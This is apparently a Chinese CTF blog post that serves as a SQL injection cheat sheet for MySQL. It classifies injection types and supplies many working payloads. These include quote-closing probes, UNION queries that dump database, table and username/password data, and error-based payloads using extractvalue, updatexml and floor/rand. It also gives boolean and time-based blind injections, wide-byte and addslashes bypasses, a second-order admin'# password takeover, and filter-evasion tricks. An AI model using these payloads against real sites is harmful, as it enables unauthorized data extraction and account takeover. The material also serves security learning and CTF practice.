---
title: sql注入总结
layout: categories
date: 2020-02-11
tags: [CTF, sql]
categories:
- [CTF, sql]
comments: false
---
# sql注入总结

## 0x00前言

------

SQL注入最主要的是判断注入目标的SQL语句和字符处理过程,根据判断结果选择合适的注入方法和技巧进行脱库

<!-- more -->

常见SQL注入类型有:

- 按变量类型
  - 字符型
  - 数字型
- 按HTTP提交方式
  - GET
  - POST
  - Cookies
  - head中
    - User-Agent
    - Referer
- 按从服务器接收到的响应
  - 显错注入(没有关闭错误显示,会显示mysql error)
  - 盲注(只会告诉你sql语句的执行结果true or false,不会将sql语句执行结果展示给你)
    - 基于时间
    - 基于bool
    - 基于报错
  - 堆叠查询注入
- 基于程度和顺序的注入
  - 一阶注入
  - 二阶注入

## 0x01常用语句

### 用于尝试

Ps:–+可以用#替换，url 提交过程中 url 编码后的#为%23

- or 1=1–+
- ‘ or 1=1–+
- “ or 1=1–+
- ) or 1=1–+
- ‘)or 1=1–+
- “) or 1=1–+
- “))or 1=1–+

总的来说,思路为闭合前面本来sql语句中的符号,注释掉后面的符号

### 用于查询

- （1）获取字段数

```
order by n  /*通过不断尝试改变n的值来观察页面反应确定字段数*/
```

- （2） 获取系统中所有数据库名

在MySQL >5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中

```
select null,null,group_concat(schema_name) from information_schema.schemata
```

- （3）获取当前数据库名

```
select null,null,...,database()
```

- （4）获取数据库中的表

```
select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database()
```

或

```
select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1
```

- （5）获取表中的字段

这里假设已经获取到表名为user

```
select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'
```

- （6）获取各个字段值

这里假设已经获取到表名为user，且字段为username和password

```
select null,group_concat(username,password) from users
```

## 0x02注入类型

### 按变量类型

#### 数字型

```
id=1 union select database()
```

#### 字符型

```
id=1' union select database()
id=1" union select database()
id=1') union select database()
id=1") union select database()
```

### 按HTTP提交方式

#### GET

参考上方按变量类型

#### POST

一般为登录框,留言板等等,以表单形式提交的字段

##### 后端无数据处理型

无数据处理,既sql语句和变量直接拼接,形式参考GET,#不需要url编码

##### 后端有数据处理型

###### 常见数据处理

- 数据处理函数

**preg_replace()**

当代码为`preg_replace('/or/i',"", $id)`时,可以利用双写过滤字符,因为替换为空,而且只检测一次

例如绕过上述只需将`or`写出`oorr`即可,替换掉中间的`or`之后,剩下的字段就变成了`or`

如果匹配中没有统计大小写,还可以利用变换语句中字母的大小写进行绕过

**addslashes()**

- 字符编码问题导致绕过
  - 设置数据库字符为gbk导致宽字节注入
  - 使用icon,mb_convert_encoding转换字符编码函数导致宽字节注入
- 编码解码导致的绕过
  - url解码导致绕过addslashes
  - base64解码导致绕过addslashes
  - json编码导致绕过addslashes
- 一些特殊情况导致的绕过
  - 没有使用引号保护字符串，直接无视addslashes
  - 使用了stripslashes
  - 字符替换导致的绕过addslashes

------

###### 宽字节注入

1、%df 吃掉 \ 具体的原因是 urlencode(‘) = %5c%27，我们在%5c%27 前面添加%df，形成%df%5c%27， mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字， 此时%df%5c 就是一个汉字， %27 则作为一个单独的符号在外面， 这样就达到了我们的目的。
2、将 \’ 中的 \ 过滤掉， 例如可以构造 %**%5c%5c%27 的情况， 后面的%5c 会被前面的%5c给注释掉。这也是 bypass 的一种方法

3、将utf-8的 ‘ 转换为 �’

�’or 1=1 limit 1,1#

还有很多绕过**引号**、**双引号**、**逗号**、**空格**的方法

#### Cookies

当php会通过cookies中username等字段进行查询时可能存在注入,与POST基本一致,只是注入位置的区别

##### head中

- User-Agent

- Referer

- XFF(X-Forward-For)

  ```
  X-Forward-For：127.0.0.1' select 1,2,user()
  ```

当php会将ip,User-Agent,referer等请求头信息进行存储数据库时,可能存在注入,与POST基本一致,只是注入位置的区别,可以通过浏览器插件、浏览器编辑和重发的功能、抓包等对请求头进行更改

### 按从服务器接收到的响应

#### 显错注入

由于php代码会将mysql中的错误展示在前端，所以很好判断，参考上方GET等

#### 盲注

##### 基于bool

- ▲left(database(),1)>’s’ //left()函数

  Explain:

  - database()显示数据库名称
  - left(a,b)从左侧截取 a 的前 b 位

- ▲ascii(substr((select table_name information_schema.tables where tables_schema

  =database()limit 0,1),1,1))=101 –+ //substr()函数，ascii()函数

  Explain：

  - substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度。

  - ascii()将某个字符转换为 ascii 值

  - ascii(substr((select database()),1,1))=98（改变第一个

    1

    和98的值相当于将名字一个个和字母比较，从而得到完整名字）

    - 也可以用二分法和>=’a’,between and等来判断

- ▲ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER

  BY id LIMIT 0,1),1,1))>98%23 //ORD()函数，MID()函数

  Explain：

  - mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位
  - Ord()函数同 ascii()，将字符转为 ascii 值

- ▲regexp 正则注入

  正则注入介绍：

  http://www.cnblogs.com/lcamry/articles/5717442.html

  用法介绍：select user() regexp ‘^[a-z]’;

  Explain：

  - 正则表达式的用法，user()结果为 root，regexp 为匹配 root 的正则表达式。第二位可以用 select user() regexp ‘^ro’来进行。

##### 基于报错

———————————构造payload 让信息通过错误提示回显出来——————

- select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;
  Explain:此处有三个点，

  - 一是需要 concat 计数，
  - 二是 floor，取得 0 or 1，进行数据的重复，
  - 三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时
    重复造成的错误。也有解释为 mysql 的 bug 的问题。
  - 但是此处需要将 rand(0)，rand()需
    要多试几次才行。
  - 以上语句可以简化成如下的形式。
    select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))
  - 如果 rand 被禁用了可以使用用户变量来报错
    select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)

- select exp(~(select * FROM(SELECT USER())a)) //double 数值类型超出范围
  //Exp()为以 e 为底的对数函数；版本在 5.5.5 及其以上
  可以参考 exp 报错文章：http://www.cnblogs.com/lcamry/articles/5509124.html

- select !(select * from (select user())x) -（ps:这是减号） ~~0
  //bigint 超出范围；~~0 是对 0 逐位取反，很大的版本在 5.5.5 及其以上

  可以参考文章 bigint 溢出文章 http://www.cnblogs.com/lcamry/articles/5509112.html

- extractvalue(1,concat(0x7e,(select @@version),0x7e))

  //mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误,32位字符限制

- updatexml(1,concat(0x7e,(select @@version),0x7e),1)

  //mysql 对 xml 数据进行查询和修改的 xpath 函数，xpath 语法错误,32位字符限制

- select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;
  //mysql 重复特性，此处重复了 version，所以报错

###### 报错注入总结和示例

- floor()和rand()

```
union select count(*),2,concat(':',(select database()),':',floor(rand()*2))as a from information_schema.tables group by a       /*利用错误信息得到当前数据库名*/
```

- extractvalue()

```
id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))
```

- updatexml()

```
id=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1))
```

- geometrycollection()

```
id=1 and geometrycollection((select * from(select * from(select user())a)b))
```

- multipoint()

```
id=1 and multipoint((select * from(select * from(select user())a)b))
```

- polygon()

```
id=1 and polygon((select * from(select * from(select user())a)b))
```

- multipolygon()

```
id=1 and multipolygon((select * from(select * from(select user())a)b))
```

- linestring()

```
id=1 and linestring((select * from(select * from(select user())a)b))
```

- multilinestring()

```
id=1 and multilinestring((select * from(select * from(select user())a)b))
```

- exp()

```
id=1 and exp(~(select * from(select user())a))
```

##### 基于时间

- If(ascii(substr(database(),1,1))>115,0,sleep(5))%23 //if 判断语句， 条件为假，执行 sleep
  Ps： 遇到以下这种利用 sleep()延时注入语句
  select sleep(find_in_set(mid(@@version, 1, 1), ‘0,1,2,3,4,5,6,7,8,9,.’));
  该语句意思是在 0-9 之间找版本号的第一位。 但是在我们实际渗透过程中， 这种用法是不可取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。
- UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE(‘MSG’,’by 5 seconds’)),null) FROM (select database() as current) as tb1;
  //BENCHMARK(count,expr)用于测试函数的性能，参数一为次数，二为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的 cpu 资源。推荐使用 sleep()

#### 堆叠查询注入

**局限性**

堆叠注入的局限性在于并不是每一个环境下都可以执行， 可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也可以解释为什么攻击者无法修改数据或者调用一些程序

**原理**

利用分号结束一句执行,从而构造多行语句进行注入攻击

## 按注入的程度和顺序

### 一阶注入

即直接注入，查看上述所有

### 二阶注入（二次注入）

1、黑客通过构造数据的形式，在浏览器或者其他软件中提交 HTTP 数据报文请求到服务
端进行处理，提交的数据报文请求中可能包含了黑客构造的 SQL 语句或者命令。

2、服务端应用程序会将黑客提交的数据信息进行存储， 通常是保存在数据库中， 保存的
数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响
应。

3、黑客向服务端发送第二个与第一次不相同的请求数据信息。

4、服务端接收到黑客提交的第二个请求信息后， 为了处理该请求， 服务端会查询数据库
中已经存储的数据信息并处理， 从而导致黑客在第一次请求中构造的 SQL 语句或者命令在服
务端环境中执行。

5、服务端返回执行的处理结果数据信息， 黑客可以通过返回的结果数据信息判断二次注
入漏洞利用是否成功。
例：

先注册一个 admin’#的账号，接下来登录该帐号后进行修改密码。此时修改的就是 admin 的密码。
Sql 语句变为 UPDATE users SET passwd=”New_Pass” WHERE username =’ admin’ # ‘ AND
password=’ ， 也 就 是 执 行 了 UPDATE users SET passwd=”New_Pass” WHERE username =’
admin’

## 0x03 基本手工注入流程

要从select语句中获得有用的信息，必须确定该数据库中的字段数和那个字段能够输出，这是前提。

### 1、MySQL >= 5.0

#### （1）获取字段数

```
order by n  /*通过不断尝试改变n的值来观察页面反应确定字段数*/
```

#### （2）获取系统数据库名

在MySQL >5.0中，数据库名存放在information_schema数据库下schemata表schema_name字段中

```
select null,null,schema_name from information_schema.schemata
```

#### （3）获取当前数据库名

```
select null,null,...,database()
```

#### （4）获取数据库中的表

```
select null,null,...,group_concat(table_name) from information_schema.tables where table_schema=database()
```

或

```
select null,null,...,table_name from information_schema.tables where table_schema=database() limit 0,1
```

#### （5）获取表中的字段

这里假设已经获取到表名为user

```
select null,null,...,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'
```

#### （6）获取各个字段值

这里假设已经获取到表名为user，且字段为username和password

```
select null,group_concat(username,password) from users
```

### 2、MySQL < 5.0

MySQL < 5.0 没有信息数据库**information_schema**，所以只能手工枚举爆破（二分法思想）。

该方式通常用于盲注。

### 相关函数

**length(str)** ：返回字符串str的长度

**substr(str, pos, len)** ：将str从pos位置开始截取len长度的字符进行返回。注意这里的pos位置是从1开始的，不是数组的0开始

**mid(str,pos,len)** ：跟上面的一样，截取字符串

**ascii(str)** ：返回字符串str的最左面字符的ASCII代码值

**ord(str)** ：将字符或布尔类型转成ascll码

**if(a,b,c)** ：a为条件，a为true，返回b，否则返回c，如if(1>2,1,0),返回0

#### （1）基于布尔的盲注

```
and ascii(substr((select database()),1,1))>64 /*判断数据库名的第一个字符的ascii值是否大于64*/
```

#### （2）基于时间的盲注

```
id=1 union select if(SUBSTRING(user(),1,4)='root',sleep(4),1),null,null /*提取用户名前四个字符做判断，正确就延迟4秒，错误返回1*/
```

## 0x04SQL注入绕过技术

- **大小写绕过**

- **双写绕过**

- **编码绕过**（url全编码、十六进制）

- **内联注释绕过**

- **关键字替换**

  - **逗号绕过**

    substr、mid()函数中可以利用from to来摆脱对逗号的利用；

    limit中可以利用offset来摆脱对逗号的利用

  - **比较符号( >、< )绕过**（greatest、between and)

  - **逻辑符号的替换**（and=&& or=|| xor=| not=!）

  - **空格绕过**（用括号，+等绕过）

- **等价函数绕过**

  - hex()、bin()=ascii()
  - concat_ws()=group_concat()
  - mid()、substr()=substring()

- **http参数污染**

  `id=1 union select+1,2,3+from+users+where+id=1–`

  变为

  `id=1 union select+1&id=2,3+from+users+where+id=1–`

- **缓冲区溢出绕过**

  (id=1 and (select 1)=(Select 0xAAAAAAAAAAAAAAAAAAAAA)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 ,27,28,29,30,31,32,33,34,35,36–+

  其中0xAAAAAAAAAAAAAAAAAAAAA这里A越多越好。。一般会存在临界值，其实这种方法还对后缀名的绕过也有用)

- 不用or and 来进行bool盲注

  原理

  ```
  id=1^1^1
  =>id=1
  ```

  payload

  ```
  1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),{0},1))={1})^1"
  #爆库
  1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%s,1))=%s)^1
  #爆字段
  ```